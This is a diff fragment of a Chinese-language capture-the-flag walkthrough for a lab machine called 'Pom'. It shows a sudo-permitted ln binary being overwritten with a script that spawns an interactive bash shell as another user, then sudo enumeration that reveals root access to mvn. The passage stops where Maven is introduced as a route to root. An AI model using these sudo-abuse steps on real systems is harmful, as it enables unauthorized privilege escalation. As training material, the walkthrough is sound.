@@ -552,4 +552,35 @@ qc2000@Pom:/tmp$ chmod 777 /tmp/mykey.pub
 qc2000@Pom:/tmp$ sudo -u terra536 /home/terra536/ln -sf /tmp/mykey.pub /home/terra536/.ssh/authorized_keys
 ln: /home/terra536/.ssh/authorized_keys: No such file or directory
 ```
-那我们只能换一个思路了，
+那我们只能换一个思路了：
+1. 写一个bash脚本，内容是启动shell
+2. 把bash脚本用`/home/terra536/ln`来把bash脚本连接到`/home/terra536/ln`上（有点绕）
+3. 最后执行`/home/terra536/ln`，这样运行`ln`就相当于用`terra536`的权限启动shell了
+```bash
+qc2000@Pom:/tmp$ chmod +x /tmp/hacker.sh
+qc2000@Pom:/tmp$ cat hacker.sh
+#!/bin/bash
+/bin/bash -i
+qc2000@Pom:/tmp$ sudo -u terra536 /home/terra536/ln -sf /tmp/hacker.sh /home/terra536/ln
+qc2000@Pom:/tmp$ sudo -u terra536 /home/terra536/ln
+Pom:/tmp$ id
+uid=1002(terra536) gid=1002(terra536) groups=1002(terra536)
+Pom:/tmp$ whoami
+terra536
+```
+横向成功
+# terra536 ---> root
+还是先信息收集一下
+```bash
+Pom:/tmp$ sudo -l
+Matching Defaults entries for terra536 on Pom:
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+Runas and Command-specific defaults for terra536:
+    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"
+
+User terra536 may run the following commands on Pom:
+    (ALL) NOPASSWD: /usr/bin/mvn
+```
+可以直接运行`root`运行`/usr/bin/mvn`（这里真不太了解，问了下ai）
+这里maven可以用来提权，因为Maven 允许在构建过程中**执行任意系统命令**
